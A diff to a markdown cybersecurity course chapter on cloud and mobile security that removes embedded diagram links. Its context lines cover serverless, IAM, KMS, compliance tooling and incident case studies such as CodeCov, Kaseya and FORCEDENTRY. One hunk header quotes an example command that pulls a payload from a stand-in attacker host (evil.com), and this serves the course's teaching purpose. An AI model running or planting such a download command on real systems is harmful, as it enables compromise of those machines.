@@ -1028,16 +768,6 @@ docker run --rm -it alpine sh -c "apk add curl && curl http://evil.com/payload"
 | 10 | Business Logic Flaws | Account creation abuse, coupon misuse | Rate limiting, idempotency tokens |
 
 ### Event Injection — Deep Dive
-
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/event-injection-deep-dive-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/event-injection-deep-dive-handwritten.svg" alt="Handwritten: Event Injection — Deep Dive" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/event-injection-deep-dive-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/event-injection-deep-dive-diagram.svg" alt="Diagram: Event Injection — Deep Dive" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/event-injection-deep-dive-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/event-injection-deep-dive-sticky.svg" alt="Sticky Note: Event Injection — Deep Dive" width="30%">
-</a>
 
 
 **Attack Flow:**
@@ -1096,16 +826,6 @@ exports.handler = async (event, context) => {
 
 ### Edge Cases — Serverless
 
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/edge-cases-serverless-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/edge-cases-serverless-handwritten.svg" alt="Handwritten: Edge Cases — Serverless" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/edge-cases-serverless-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/edge-cases-serverless-diagram.svg" alt="Diagram: Edge Cases — Serverless" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/edge-cases-serverless-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/edge-cases-serverless-sticky.svg" alt="Sticky Note: Edge Cases — Serverless" width="30%">
-</a>
-
 
 - **Event source replay:** SQS events are retried. Ensure idempotency — same event processed twice should produce same result.
 - **Warm container reuse:** Environment variables from previous invocation persist. Never store per-request secrets in mutable global state.
@@ -1118,16 +838,6 @@ exports.handler = async (event, context) => {
 ## Cloud Compliance
 
 ### CIS Benchmarks for AWS, Azure, GCP
-
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/cis-benchmarks-for-aws-azure-gcp-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/cis-benchmarks-for-aws-azure-gcp-handwritten.svg" alt="Handwritten: CIS Benchmarks for AWS, Azure, GCP" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/cis-benchmarks-for-aws-azure-gcp-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/cis-benchmarks-for-aws-azure-gcp-diagram.svg" alt="Diagram: CIS Benchmarks for AWS, Azure, GCP" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/cis-benchmarks-for-aws-azure-gcp-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/cis-benchmarks-for-aws-azure-gcp-sticky.svg" alt="Sticky Note: CIS Benchmarks for AWS, Azure, GCP" width="30%">
-</a>
 
 
 The Center for Internet Security (CIS) publishes benchmark documents with prescriptive configuration checks for cloud platforms.
@@ -1185,16 +895,6 @@ aws configservice get-compliance-summary --resource-types "AWS::S3::Bucket"
 
 ### CSPM (Cloud Security Posture Management)
 
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/cspm-cloud-security-posture-management-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/cspm-cloud-security-posture-management-handwritten.svg" alt="Handwritten: CSPM (Cloud Security Posture Management)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/cspm-cloud-security-posture-management-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/cspm-cloud-security-posture-management-diagram.svg" alt="Diagram: CSPM (Cloud Security Posture Management)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/cspm-cloud-security-posture-management-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/cspm-cloud-security-posture-management-sticky.svg" alt="Sticky Note: CSPM (Cloud Security Posture Management)" width="30%">
-</a>
-
 
 **CSPM tools** continuously monitor cloud environments for misconfigurations, compliance violations, and security risks.
 
@@ -1207,16 +907,6 @@ aws configservice get-compliance-summary --resource-types "AWS::S3::Bucket"
 | Identity analytics | Detect over-permissive IAM roles | AWS IAM Access Analyzer |
 
 ### CWPP (Cloud Workload Protection Platform)
-
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/cwpp-cloud-workload-protection-platform-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/cwpp-cloud-workload-protection-platform-handwritten.svg" alt="Handwritten: CWPP (Cloud Workload Protection Platform)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/cwpp-cloud-workload-protection-platform-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/cwpp-cloud-workload-protection-platform-diagram.svg" alt="Diagram: CWPP (Cloud Workload Protection Platform)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/cwpp-cloud-workload-protection-platform-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/cwpp-cloud-workload-protection-platform-sticky.svg" alt="Sticky Note: CWPP (Cloud Workload Protection Platform)" width="30%">
-</a>
 
 
 CWPP protects workloads (VMs, containers, serverless) with agent-based and agentless security.
@@ -1231,16 +921,6 @@ CWPP protects workloads (VMs, containers, serverless) with agent-based and agent
 
 ### CASB (Cloud Access Security Broker)
 
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/casb-cloud-access-security-broker-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/casb-cloud-access-security-broker-handwritten.svg" alt="Handwritten: CASB (Cloud Access Security Broker)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/casb-cloud-access-security-broker-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/casb-cloud-access-security-broker-diagram.svg" alt="Diagram: CASB (Cloud Access Security Broker)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/casb-cloud-access-security-broker-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/casb-cloud-access-security-broker-sticky.svg" alt="Sticky Note: CASB (Cloud Access Security Broker)" width="30%">
-</a>
-
 
 CASBs sit between users and cloud services to enforce security policies.
 
@@ -1252,16 +932,6 @@ CASBs sit between users and cloud services to enforce security policies.
 | Log-based | Ingest cloud logs for analysis | Compliance monitoring |
 
 ### CIEM (Cloud Infrastructure Entitlement Management)
-
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/ciem-cloud-infrastructure-entitlement-management-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/ciem-cloud-infrastructure-entitlement-management-handwritten.svg" alt="Handwritten: CIEM (Cloud Infrastructure Entitlement Management)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/ciem-cloud-infrastructure-entitlement-management-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/ciem-cloud-infrastructure-entitlement-management-diagram.svg" alt="Diagram: CIEM (Cloud Infrastructure Entitlement Management)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/ciem-cloud-infrastructure-entitlement-management-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/ciem-cloud-infrastructure-entitlement-management-sticky.svg" alt="Sticky Note: CIEM (Cloud Infrastructure Entitlement Management)" width="30%">
-</a>
 
 
 CIEM focuses on managing cloud IAM permissions at scale.
@@ -1289,16 +959,6 @@ CIEM focuses on managing cloud IAM permissions at scale.
 **Analogy:** A corporate office building. IAM is the badge system — who can enter which floors, which rooms, and at what times. Just because someone works on Floor 3 doesn't mean they can access the CEO's office on Floor 10.
 
 ### Principle #1: Least Privilege
-
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/principle-1-least-privilege-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/principle-1-least-privilege-handwritten.svg" alt="Handwritten: Principle #1: Least Privilege" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/principle-1-least-privilege-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/principle-1-least-privilege-diagram.svg" alt="Diagram: Principle #1: Least Privilege" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/principle-1-least-privilege-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/principle-1-least-privilege-sticky.svg" alt="Sticky Note: Principle #1: Least Privilege" width="30%">
-</a>
 
 
 **Numbered Steps — Implementing Least Privilege:**
@@ -1331,16 +991,6 @@ aws iam put-user-policy --user-name backup-service --policy-name s3-backup-polic
 
 ### IAM Policy Simulation
 
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/iam-policy-simulation-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/iam-policy-simulation-handwritten.svg" alt="Handwritten: IAM Policy Simulation" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/iam-policy-simulation-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/iam-policy-simulation-diagram.svg" alt="Diagram: IAM Policy Simulation" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/iam-policy-simulation-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/iam-policy-simulation-sticky.svg" alt="Sticky Note: IAM Policy Simulation" width="30%">
-</a>
-
 
 ```bash
 # Simulate IAM policy to verify intended access
@@ -1363,16 +1013,6 @@ aws iam simulate-principal-policy --policy-source-arn arn:aws:iam::ACCOUNT:user/
 ```
 
 ### IAM Access Analyzer
-
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/iam-access-analyzer-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/iam-access-analyzer-handwritten.svg" alt="Handwritten: IAM Access Analyzer" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/iam-access-analyzer-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/iam-access-analyzer-diagram.svg" alt="Diagram: IAM Access Analyzer" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/iam-access-analyzer-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/iam-access-analyzer-sticky.svg" alt="Sticky Note: IAM Access Analyzer" width="30%">
-</a>
 
 
 ```bash
@@ -1407,16 +1047,6 @@ Output: Finding created with remediation steps
 
 ### Edge Cases — Cloud IAM
 
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/edge-cases-cloud-iam-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/edge-cases-cloud-iam-handwritten.svg" alt="Handwritten: Edge Cases — Cloud IAM" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/edge-cases-cloud-iam-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/edge-cases-cloud-iam-diagram.svg" alt="Diagram: Edge Cases — Cloud IAM" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/edge-cases-cloud-iam-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/edge-cases-cloud-iam-sticky.svg" alt="Sticky Note: Edge Cases — Cloud IAM" width="30%">
-</a>
-
 
 - **Resource-based policies (S3 bucket policy + IAM user policy):** Combined evaluation — granted if EITHER policy allows (AND there's no explicit Deny). Confusing behavior for new cloud engineers.
 - **Cross-account roles:** Trust policy (in target account) + permissions policy. Both must be configured correctly. Sts:AssumeRole required.
@@ -1428,16 +1058,6 @@ Output: Finding created with remediation steps
 ## Cloud Data Protection
 
 ### KMS (Key Management Service)
-
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/kms-key-management-service-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/kms-key-management-service-handwritten.svg" alt="Handwritten: KMS (Key Management Service)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/kms-key-management-service-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/kms-key-management-service-diagram.svg" alt="Diagram: KMS (Key Management Service)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/kms-key-management-service-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/kms-key-management-service-sticky.svg" alt="Sticky Note: KMS (Key Management Service)" width="30%">
-</a>
 
 
 **Real-World Analogy:** A master key cabinet in a hotel. Each room (data) has its own key. KMS is the front desk that securely manages all the keys. You ask the front desk to lock or unlock, but you never touch the master key itself.
@@ -1468,16 +1088,6 @@ aws kms enable-key-rotation --key-id alias/prod-key
 
 ### HSM (Hardware Security Module)
 
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/hsm-hardware-security-module-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/hsm-hardware-security-module-handwritten.svg" alt="Handwritten: HSM (Hardware Security Module)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/hsm-hardware-security-module-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/hsm-hardware-security-module-diagram.svg" alt="Diagram: HSM (Hardware Security Module)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/hsm-hardware-security-module-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/hsm-hardware-security-module-sticky.svg" alt="Sticky Note: HSM (Hardware Security Module)" width="30%">
-</a>
-
 
 **Analogy:** A bank vault within a bank vault. HSM is a tamper-resistant hardware appliance that stores keys. Even AWS employees cannot extract keys from an HSM. Used for FIPS 140-2 Level 3 compliance.
 
@@ -1492,16 +1102,6 @@ aws kms enable-key-rotation --key-id alias/prod-key
 | GCP | Cloud HSM | FIPS 140-2 Level 3 | CMEK with HSM backing |
 
 ### Envelope Encryption
-
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/envelope-encryption-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/envelope-encryption-handwritten.svg" alt="Handwritten: Envelope Encryption" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/envelope-encryption-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/envelope-encryption-diagram.svg" alt="Diagram: Envelope Encryption" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/envelope-encryption-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/envelope-encryption-sticky.svg" alt="Sticky Note: Envelope Encryption" width="30%">
-</a>
 
 
 **Concept:** Encrypt data with a Data Encryption Key (DEK). Encrypt the DEK with a Key Encryption Key (KEK). Store the encrypted DEK alongside the data.
@@ -1564,16 +1164,6 @@ async function envelopeDecrypt(encryptedData, encryptedKey, iv, tag) {
 
 ### A&D Table — Cloud Data Protection
 
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/a-d-table-cloud-data-protection-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/a-d-table-cloud-data-protection-handwritten.svg" alt="Handwritten: A&D Table — Cloud Data Protection" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/a-d-table-cloud-data-protection-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/a-d-table-cloud-data-protection-diagram.svg" alt="Diagram: A&D Table — Cloud Data Protection" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/a-d-table-cloud-data-protection-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/a-d-table-cloud-data-protection-sticky.svg" alt="Sticky Note: A&D Table — Cloud Data Protection" width="30%">
-</a>
-
 
 | Approach | Advantages | Disadvantages |
 |----------|-----------|---------------|
@@ -1584,16 +1174,6 @@ async function envelopeDecrypt(encryptedData, encryptedKey, iv, tag) {
 | HSM | Tamper-resistant, compliance | High cost, slower operations |
 
 ### Edge Cases — Cloud Data Protection
-
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/edge-cases-cloud-data-protection-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/edge-cases-cloud-data-protection-handwritten.svg" alt="Handwritten: Edge Cases — Cloud Data Protection" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/edge-cases-cloud-data-protection-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/edge-cases-cloud-data-protection-diagram.svg" alt="Diagram: Edge Cases — Cloud Data Protection" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/edge-cases-cloud-data-protection-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/edge-cases-cloud-data-protection-sticky.svg" alt="Sticky Note: Edge Cases — Cloud Data Protection" width="30%">
-</a>
 
 
 - **KMS key deletion:** Keys have a 7-30 day waiting period. Once deleted, all data encrypted with that key is permanently inaccessible.
@@ -1609,16 +1189,6 @@ async function envelopeDecrypt(encryptedData, encryptedKey, iv, tag) {
 
 ### Attack Timeline
 
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/attack-timeline-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/attack-timeline-handwritten.svg" alt="Handwritten: Attack Timeline" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/attack-timeline-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/attack-timeline-diagram.svg" alt="Diagram: Attack Timeline" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/attack-timeline-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/attack-timeline-sticky.svg" alt="Sticky Note: Attack Timeline" width="30%">
-</a>
-
 
 | Phase | What Happened | Attack Technique |
 |-------|--------------|------------------|
@@ -1631,16 +1201,6 @@ async function envelopeDecrypt(encryptedData, encryptedKey, iv, tag) {
 
 ### Root Cause Analysis
 
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/root-cause-analysis-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/root-cause-analysis-handwritten.svg" alt="Handwritten: Root Cause Analysis" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/root-cause-analysis-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/root-cause-analysis-diagram.svg" alt="Diagram: Root Cause Analysis" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/root-cause-analysis-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/root-cause-analysis-sticky.svg" alt="Sticky Note: Root Cause Analysis" width="30%">
-</a>
-
 
 | Root Cause | Impact | Fix Applied |
 |------------|--------|-------------|
@@ -1651,16 +1211,6 @@ async function envelopeDecrypt(encryptedData, encryptedKey, iv, tag) {
 | No SCP restricting resource access | Unlimited S3 enumeration | SCP to restrict actions to specific account |
 
 ### Mitigation — EC2 IMDSv2 Hardening
-
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/mitigation-ec2-imdsv2-hardening-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/mitigation-ec2-imdsv2-hardening-handwritten.svg" alt="Handwritten: Mitigation — EC2 IMDSv2 Hardening" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/mitigation-ec2-imdsv2-hardening-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/mitigation-ec2-imdsv2-hardening-diagram.svg" alt="Diagram: Mitigation — EC2 IMDSv2 Hardening" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/mitigation-ec2-imdsv2-hardening-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/mitigation-ec2-imdsv2-hardening-sticky.svg" alt="Sticky Note: Mitigation — EC2 IMDSv2 Hardening" width="30%">
-</a>
 
 
 ```bash
@@ -1685,16 +1235,6 @@ aws ec2 modify-instance-metadata-options --instance-id i-12345 \
 
 ### Attack Flow
 
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/attack-flow-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/attack-flow-handwritten.svg" alt="Handwritten: Attack Flow" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/attack-flow-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/attack-flow-diagram.svg" alt="Diagram: Attack Flow" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/attack-flow-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/attack-flow-sticky.svg" alt="Sticky Note: Attack Flow" width="30%">
-</a>
-
 
 1. Attacker identified that CodeCov's Docker image build process leaked environment variables in the image layers.
 2. The `docker save` command preserved environment variable history in intermediate image layers.
@@ -1708,16 +1248,6 @@ aws ec2 modify-instance-metadata-options --instance-id i-12345 \
 
 ### Root Causes
 
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/root-causes-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/root-causes-handwritten.svg" alt="Handwritten: Root Causes" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/root-causes-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/root-causes-diagram.svg" alt="Diagram: Root Causes" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/root-causes-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/root-causes-sticky.svg" alt="Sticky Note: Root Causes" width="30%">
-</a>
-
 
 | Issue | Fix |
 |-------|-----|
@@ -1727,16 +1257,6 @@ aws ec2 modify-instance-metadata-options --instance-id i-12345 \
 | Public Docker image | Private registry with pull secrets |
 
 ### Secure Docker Build Pipeline
-
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/secure-docker-build-pipeline-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/secure-docker-build-pipeline-handwritten.svg" alt="Handwritten: Secure Docker Build Pipeline" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/secure-docker-build-pipeline-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/secure-docker-build-pipeline-diagram.svg" alt="Diagram: Secure Docker Build Pipeline" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/secure-docker-build-pipeline-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/secure-docker-build-pipeline-sticky.svg" alt="Sticky Note: Secure Docker Build Pipeline" width="30%">
-</a>
 
 
 ```dockerfile
@@ -1765,16 +1285,6 @@ COPY --from=builder /app/data.json /app/data.json
 
 ### Attack Timeline
 
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/attack-timeline-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/attack-timeline-handwritten.svg" alt="Handwritten: Attack Timeline" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/attack-timeline-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/attack-timeline-diagram.svg" alt="Diagram: Attack Timeline" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/attack-timeline-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/attack-timeline-sticky.svg" alt="Sticky Note: Attack Timeline" width="30%">
-</a>
-
 
 | Phase | Detail | Technique |
 |-------|--------|-----------|
@@ -1786,16 +1296,6 @@ COPY --from=builder /app/data.json /app/data.json
 | Escalation | Decrypted REvil binary on 1,500+ businesses | Supply chain ransomware |
 
 ### Key Lessons
-
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/key-lessons-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/key-lessons-handwritten.svg" alt="Handwritten: Key Lessons" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/key-lessons-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/key-lessons-diagram.svg" alt="Diagram: Key Lessons" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/key-lessons-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/key-lessons-sticky.svg" alt="Sticky Note: Key Lessons" width="30%">
-</a>
 
 
 | Lesson | Implementation |
@@ -1813,16 +1313,6 @@ COPY --from=builder /app/data.json /app/data.json
 
 ### Technical Breakdown
 
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/technical-breakdown-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/technical-breakdown-handwritten.svg" alt="Handwritten: Technical Breakdown" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/technical-breakdown-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/technical-breakdown-diagram.svg" alt="Diagram: Technical Breakdown" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/technical-breakdown-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/technical-breakdown-sticky.svg" alt="Sticky Note: Technical Breakdown" width="30%">
-</a>
-
 
 | Component | Detail |
 |-----------|--------|
@@ -1834,16 +1324,6 @@ COPY --from=builder /app/data.json /app/data.json
 | Data exfiltration | Microphone, camera, GPS, iMessage, WhatsApp, Telegram, Signal |
 
 ### FORCEDENTRY Exploit Chain
-
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/forcedentry-exploit-chain-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/forcedentry-exploit-chain-handwritten.svg" alt="Handwritten: FORCEDENTRY Exploit Chain" width="30%">
-</a>
